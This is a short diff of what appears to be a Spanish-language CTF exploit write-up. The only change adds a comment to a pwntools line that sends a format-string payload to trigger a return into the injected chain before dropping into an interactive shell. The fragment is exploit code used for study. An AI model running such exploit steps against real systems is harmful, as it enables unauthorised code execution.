@@ -287,7 +287,7 @@ for i in range(len(chain)):
     io.sendlineafter(b">> ", p)
 
 s = b"%s".ljust(8,b"_")
-io.sendlineafter(b">> ",s)
+io.sendlineafter(b">> ",s)                        # Provocar el retorno y con ello la llamada a nuestro codigo
 io.interactive()
 ```
 
